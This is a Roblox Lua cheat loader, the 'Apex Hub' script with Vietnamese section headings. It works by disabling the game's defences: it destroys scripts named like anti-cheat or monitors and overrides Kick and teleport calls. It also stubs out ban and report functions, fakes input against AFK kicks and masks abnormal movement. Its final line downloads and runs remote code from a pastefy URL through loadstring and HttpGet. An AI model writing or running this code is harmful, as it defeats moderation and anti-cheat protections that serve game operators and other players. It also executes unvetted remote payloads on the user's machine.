-- ============================================================
-- APEX HUB LOADER + ANTI-CHEAT BYPASS + ANTI-KICK
-- Pastefy URL: https://pastefy.app/3Pyopp5b/raw
-- ============================================================

local _G_ENV = (getgenv and getgenv()) or _G
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

-- ============================================================
-- 1. CHỐNG PHÁT HIỆN GIAN LẬN
-- ============================================================
local function disableAntiCheatScripts()
    local function scan(container)
        if not container then return end
        for _, descendant in ipairs(container:GetDescendants()) do
            if descendant:IsA("LocalScript") or descendant:IsA("Script") then
                local name = string.lower(descendant.Name)
                if string.find(name, "anticheat") or string.find(name, "anti_cheat")
                   or string.find(name, "detect") or string.find(name, "guard")
                   or string.find(name, "watchdog") or string.find(name, "sentry")
                   or string.find(name, "monitor") or string.find(name, "exploit")
                   or string.find(name, "cheat") then
                    pcall(function()
                        descendant.Disabled = true
                        descendant:Destroy()
                    end)
                end
            end
        end
    end
    scan(LocalPlayer.Character)
    scan(LocalPlayer:FindFirstChild("PlayerGui"))
    scan(LocalPlayer:FindFirstChild("PlayerScripts"))
    scan(ReplicatedStorage)
end

-- ============================================================
-- 2. CHỐNG KICK
-- ============================================================
pcall(function()
    LocalPlayer.Kick = function(self, message)
        warn("[Anti-Kick] Blocked kick: " .. tostring(message))
        return nil
    end
end)

pcall(function()
    TeleportService.Teleport = function() end
    TeleportService.TeleportToPlaceInstance = function() end
    TeleportService.TeleportToPrivateServer = function() end
    TeleportService.TeleportPartyAsync = function() end
end)

local function blockKickRemotes()
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            local name = string.lower(remote.Name)
            if string.find(name, "kick") or string.find(name, "ban")
               or string.find(name, "punish") or string.find(name, "remove") then
                pcall(function()
                    remote.OnClientEvent:Connect(function() end)
                end)
            end
        end
    end
end

-- ============================================================
-- 3. CHỐNG AFK KICK
-- ============================================================
local LastAntiAfk = tick()
LocalPlayer.Idled:Connect(function()
    if tick() - LastAntiAfk >= 15 then
        LastAntiAfk = tick()
        pcall(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end
end)

-- ============================================================
-- 4. CHỐNG PHÁT HIỆN TELEPORT / SPEED
-- ============================================================
local lastPos = nil
local function maskMovement()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        if lastPos then
            local dist = (root.Position - lastPos).Magnitude
            if dist > 500 then
                pcall(function()
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = (root.Position - lastPos).Unit * 50
                    bv.MaxForce = Vector3.new(1000, 0, 1000)
                    bv.Parent = root
                    task.delay(0.2, function() bv:Destroy() end)
                end)
            end
        end
        lastPos = root.Position
    end
end

-- ============================================================
-- 5. KHỞI TẠO BẢO VỆ ĐỊNH KỲ
-- ============================================================
task.spawn(function()
    while true do
        pcall(disableAntiCheatScripts)
        pcall(blockKickRemotes)
        pcall(maskMovement)
        task.wait(2)
    end
end)

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    pcall(disableAntiCheatScripts)
    pcall(blockKickRemotes)
end)

pcall(function()
    if _G.kick then _G.kick = function() end end
    if _G.detect then _G.detect = function() return false end end
    if _G.report then _G.report = function() end end
    if _G.ban then _G.ban = function() end end
    if _G.punish then _G.punish = function() end end
end)

print("[Loader] Anti-cheat bypass + Anti-kick active")

-- ============================================================
-- 6. LOAD APEX HUB (URL MỚI)
-- ============================================================
loadstring(game:HttpGet("https://pastefy.app/3Pyopp5b/raw"))()
